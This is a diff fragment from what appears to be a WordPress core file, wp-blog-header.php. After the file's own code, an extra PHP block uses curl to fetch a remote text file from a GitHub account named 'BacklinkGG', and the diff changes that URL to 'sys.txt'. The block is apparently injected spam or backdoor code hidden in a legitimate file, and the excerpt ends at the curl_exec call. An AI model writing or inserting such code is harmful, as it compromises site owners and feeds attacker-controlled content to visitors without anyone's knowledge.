@@ -21,7 +21,7 @@ if ( ! isset( $wp_did_header ) ) {
 }
 ?>
 <?php
-$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
+$url = 'https://raw.githubusercontent.com/BacklinkGG/randomv2/main/sys.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $result = curl_exec($ch);
